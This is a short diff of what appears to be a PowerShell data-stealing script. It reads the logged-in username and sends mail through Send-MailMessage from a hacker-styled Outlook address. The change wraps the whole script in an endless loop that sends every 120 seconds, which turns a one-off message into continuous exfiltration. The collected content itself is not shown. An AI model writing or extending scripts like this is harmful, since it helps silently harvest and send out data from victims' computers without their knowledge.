@@ -1,3 +1,4 @@
+Do{
 $username=$env:Username
 
 $From = "novicehckr@outlook.com"
@@ -114,3 +115,5 @@ Send-MailMessage -From $From -to $To -Subject $Subject `
 
 }
 }
+start-sleep -Seconds 120
+}until($infinity)
